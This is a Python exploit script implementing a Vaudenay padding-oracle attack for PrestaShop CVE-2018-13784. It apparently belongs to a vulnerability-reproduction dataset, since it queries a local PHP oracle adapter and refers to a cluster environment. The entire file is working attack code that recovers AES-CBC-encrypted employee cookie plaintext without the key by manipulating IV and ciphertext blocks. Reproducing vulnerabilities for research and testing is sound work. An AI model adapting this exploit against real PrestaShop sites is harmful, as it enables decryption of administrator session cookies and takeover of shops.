#!/usr/bin/env python3
"""
Padding-oracle exploit (Vaudenay / Cryptopals-17 algorithm) for the PrestaShop
CVE-2018-13784 reproduction (PrestaShop 1.6.1.19 Rijndael cookie encryption).

PrestaShop 1.6.1.19 encrypts the employee cookie with AES-128-CBC and then exposes
whether the PKCS#7 padding was valid -- a Vaudenay padding oracle. This exploit
recovers the plaintext without the key by manipulating the IV / ciphertext blocks
and observing the oracle's valid/invalid response.

Invoked as: python3 exploit.py <oracle_path> <key> <ciphertext>
  oracle_path : path to the PHP oracle_adapter.php (run via the project's PHP binary)
  ciphertext  : base64(IV[16] || ciphertext) followed by a 6-digit length suffix
The PHP adapter has no persistent `serve` mode, so each oracle query spawns one PHP
process (slow but functional). Prints ONLY the recovered plaintext to stdout.
"""
import sys
import os
import json
import base64
import shutil
import subprocess

BLOCK = 16

# The dataset entry runs the adapter with this cluster PHP binary; fall back to a
# locally-discovered php so the exploit also runs outside the cluster.
CLUSTER_PHP = "/data/upftfg31/.conda/envs/unsloth_env/bin/php"


def find_php():
    if os.path.exists(CLUSTER_PHP):
        return CLUSTER_PHP
    local = shutil.which("php")
    if local:
        return local
    raise FileNotFoundError("PHP interpreter not found (cluster path absent and 'php' not on PATH)")


class Oracle:
    """Padding oracle backed by one PHP `decrypt` process per query."""

    def __init__(self, oracle_path, key, php_bin):
        self.oracle_path = oracle_path
        self.key = key
        self.php_bin = php_bin

    def __call__(self, prev, block):
        # PrestaShop 1.6.1.19 wire: base64(IV || ciphertext) + 6-digit length suffix.
        # The adapter strips and ignores the suffix, so any 6 digits work.
        cookie = base64.b64encode(bytes(prev) + bytes(block)).decode() + "000016"
        try:
            r = subprocess.run(
                [self.php_bin, self.oracle_path, "decrypt", cookie, self.key],
                capture_output=True, text=True,
            )
            resp = json.loads(r.stdout)            # stdout is clean JSON; stderr carries "command=" noise
        except (ValueError, OSError):
            return False
        return bool(resp.get("plaintext_b64", ""))  # non-empty => padding VALID


def single_block_attack(block, oracle):
    zeroing = [0] * BLOCK
    for pad_val in range(1, BLOCK + 1):
        prev = [pad_val ^ b for b in zeroing]
        for cand in range(256):
            prev[-pad_val] = cand
            if oracle(prev, block):
                if pad_val == 1:
                    # Disambiguate a real 0x01 pad from an accidental longer pad.
                    prev[-2] ^= 1
                    if not oracle(prev, block):
                        prev[-2] ^= 1
                        continue
                    prev[-2] ^= 1
                break
        else:
            raise Exception("no valid padding byte found at position %d" % pad_val)
        zeroing[-pad_val] = cand ^ pad_val
    return zeroing


def full_attack(iv, ct, oracle, max_bytes=None):
    blocks = [iv] + [ct[i:i + BLOCK] for i in range(0, len(ct), BLOCK)]
    out = b""
    for i in range(1, len(blocks)):
        zeroing = single_block_attack(blocks[i], oracle)
        out += bytes(a ^ b for a, b in zip(blocks[i - 1], zeroing))
        if max_bytes is not None and len(out) >= max_bytes:
            break
    return out


def pkcs7_unpad(d):
    if not d:
        return d
    p = d[-1]
    if 1 <= p <= BLOCK and d[-p:] == bytes([p]) * p:
        return d[:-p]
    return d


def main():
    args = sys.argv[1:]
    max_bytes = None
    if "--max-bytes" in args:
        i = args.index("--max-bytes")
        max_bytes = int(args[i + 1])
        del args[i:i + 2]
    if len(args) < 3:
        sys.exit(1)
    oracle_path, key, ciphertext = args[0], args[1], args[2]

    combined = base64.b64decode(ciphertext[:-6])   # drop the 6-digit length suffix
    iv, ct = combined[:BLOCK], combined[BLOCK:]
    if len(iv) != BLOCK or len(ct) == 0 or len(ct) % BLOCK != 0:
        sys.exit(1)

    oracle = Oracle(oracle_path, key, find_php())
    recovered = pkcs7_unpad(full_attack(iv, ct, oracle, max_bytes=max_bytes))
    sys.stdout.write(recovered.decode("utf-8", errors="replace"))


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception:
        sys.exit(1)   # any parse/recovery failure: print nothing, exit non-zero
